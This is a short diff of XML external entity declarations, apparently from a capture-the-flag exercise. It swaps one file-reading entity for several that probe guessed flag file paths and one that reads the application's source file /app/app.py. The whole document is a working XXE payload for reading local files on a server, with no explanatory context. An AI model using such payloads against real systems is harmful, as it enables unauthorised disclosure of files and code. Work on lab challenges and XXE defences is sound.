@@ -1,1 +1,7 @@
-<!ENTITY xxe SYSTEM "file://flag.txt">
+<!ENTITY p1 SYSTEM "file:///app/flag.txt">
+<!ENTITY p2 SYSTEM "file:///app/flag">
+<!ENTITY p3 SYSTEM "file:///flag.txt">
+<!ENTITY p4 SYSTEM "file:///home/appuser/flag.txt">
+<!ENTITY p5 SYSTEM "file:///app/FLAG">
+
+<!ENTITY test1 SYSTEM "file:///app/app.py">
